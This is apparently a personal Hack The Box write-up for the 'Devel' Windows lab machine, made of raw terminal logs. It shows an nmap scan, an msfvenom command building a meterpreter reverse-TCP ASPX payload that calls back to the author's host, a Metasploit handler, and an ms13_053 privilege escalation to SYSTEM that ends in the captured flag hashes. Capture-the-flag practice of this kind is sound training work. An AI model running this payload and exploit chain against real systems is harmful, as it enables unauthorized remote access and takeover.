# How to solove ?

## add Lame to /etc/hosts
sudo vim /etc/hosts

## scan on nmap 
`nmap -sC -sV -sT -Pn  10.10.10.5`  


<details><summary>nmap 実行結果</summary> 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-10 01:51 JST
Nmap scan report for 10.10.10.5
Host is up (0.30s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.45 seconds
</details>

###  Summary
PORT     STATE  SERVICE       VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.134 LPORT=4444 -f aspx > devel.aspx

meterpreter > cat root.txt 
e621a0b5041708797c4fc4728bc72b4bmeterpreter

┌──(hage㉿kai)-[~/CheatSheet/writeup/htb/devel]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.134 LPORT=4444 -f aspx > devel.aspx                                                                                    15 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2899 bytes

┌──(hage㉿kai)-[~/CheatSheet/writeup/htb/devel]
└─$ msfconsole                                                                                                                                                                  127 ⨯ 15 ⚙
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                                                              
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                                                              
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                                                              
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                                                              
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                                                              
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                                                              
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                                                              
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                              
                                                                                                                                                                                           

       =[ metasploit v6.0.30-dev-                         ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > showoptions
[-] Unknown command: showoptions.
msf6 exploit(multi/handler) >  show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[-] Handler failed to bind to 10.10.16.134:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.134:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.134:4444 -> 10.10.10.5:49189) at 2021-02-10 03:19:46 +0900
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.16.134:4444 -> 10.10.10.5:49190) at 2021-02-10 03:19:48 +0900

meterpreter > w
[*] 10.10.10.5 - Meterpreter session 2 closed.  Reason: Died
[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
hoami
[-] Unknown command: whoami.
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.134:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.16.134:4444 -> 10.10.10.5:49192) at 2021-02-10 03:20:58 +0900

meterpreter > background
[*] Backgrounding session 3...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[-] Post failed: NoMethodError undefined method `session_host' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/recon/local_exploit_suggester.rb:176:in `print_error'
msf6 post(multi/recon/local_exploit_suggester) > run
[-] Post failed: NoMethodError undefined method `session_host' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/recon/local_exploit_suggester.rb:176:in `print_error'
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[-] Post failed: NoMethodError undefined method `session_host' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/recon/local_exploit_suggester.rb:176:in `print_error'
msf6 post(multi/recon/local_exploit_suggester) > set session 3
session => 3
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 37 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms13_053_schlamperei) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms13_053_schlamperei) > run

[-] Exploit failed: One or more options failed to validate: SESSION.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms13_053_schlamperei) > set session 3
session => 3
msf6 exploit(windows/local/ms13_053_schlamperei) > run

[*] Started reverse TCP handler on 10.10.16.134:4444 
[*] Launching notepad to host the exploit...
[+] Process 3676 launched.
[*] Reflectively injecting the exploit DLL into 3676...
[*] Injecting exploit into 3676...
[*] Found winlogon.exe with PID 476
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.16.134:4444 -> 10.10.10.5:49193) at 2021-02-10 03:24:04 +0900

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > pwd
C:\Windows\system32
meterpreter > cd /
meterpreter > ls
[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
meterpreter > dir
[-] Error running command dir: NoMethodError undefined method `[]' for nil:NilClass
meterpreter > search user.txt
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > search -f user.txt
No files matching your search were found.
meterpreter > cd '\Users\Administrator\Desktop\'
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 08:16:53 +0900  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 08:17:20 +0900  root.txt

meterpreter > cat root.txt 
e621a0b5041708797c4fc4728bc72b4bmeterpreter > cd '\Users\'
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-03-18 08:16:43 +0900  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 13:53:55 +0900  All Users
40777/rwxrwxrwx   8192  dir   2017-03-18 08:06:26 +0900  Classic .NET AppPool
40555/r-xr-xr-x   8192  dir   2009-07-14 11:37:05 +0900  Default
40777/rwxrwxrwx   0     dir   2009-07-14 13:53:55 +0900  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 11:37:05 +0900  Public
40777/rwxrwxrwx   8192  dir   2017-03-17 23:17:37 +0900  babis
100666/rw-rw-rw-  174   fil   2009-07-14 13:41:57 +0900  desktop.ini

meterpreter > cd babis
meterpreter > ls
Listing: C:\Users\babis
=======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  AppData
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Application Data
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:44 +0900  Contacts
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Cookies
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Desktop
40555/r-xr-xr-x   4096    dir   2017-03-17 23:17:40 +0900  Documents
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Downloads
40555/r-xr-xr-x   4096    dir   2017-03-17 23:17:40 +0900  Favorites
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Links
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Music
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-17 23:17:40 +0900  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-03-17 23:17:40 +0900  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-03-17 23:17:40 +0900  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-03-17 23:17:40 +0900  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  NetHood
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Pictures
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  PrintHood
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Recent
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Saved Games
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:52 +0900  Searches
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  SendTo
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-17 23:17:40 +0900  Templates
40555/r-xr-xr-x   0       dir   2017-03-17 23:17:40 +0900  Videos
100666/rw-rw-rw-  262144  fil   2017-03-17 23:17:40 +0900  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2017-03-17 23:17:40 +0900  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-03-17 23:17:40 +0900  ntuser.ini

meterpreter > cd desktop
meterpreter > ls
Listing: C:\Users\babis\desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-17 23:17:51 +0900  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 08:14:21 +0900  user.txt.txt

meterpreter > cat user.txt.txt 
9ecdd6a3aedf24b41562fea70f4cb3e8meterpreter > 
